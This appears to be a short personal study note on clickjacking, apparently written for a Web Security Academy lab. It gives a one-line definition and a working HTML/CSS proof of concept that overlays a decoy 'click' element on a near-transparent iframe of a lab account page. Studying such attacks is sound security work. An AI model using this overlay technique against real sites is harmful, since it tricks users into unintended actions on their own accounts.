- Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website. 
- An example of using the style tag and parameters

```js
<head> 
	<style> 
	iframe { 
		position:relative; 
		width:1280px; 
		height:1280px; 
		opacity:0.1; 
		z-index:2; 
	} 
	div { 
		position:absolute;
		top:530px;
		left:100px; 
	} 
	</style> 
</head> 
<body> 
	<div>click</div> 
	<iframe  src="https://0a25003f03cc927b80cae01600aa0007.web-security-academy.net/my-account"> </iframe> 
</body>
```



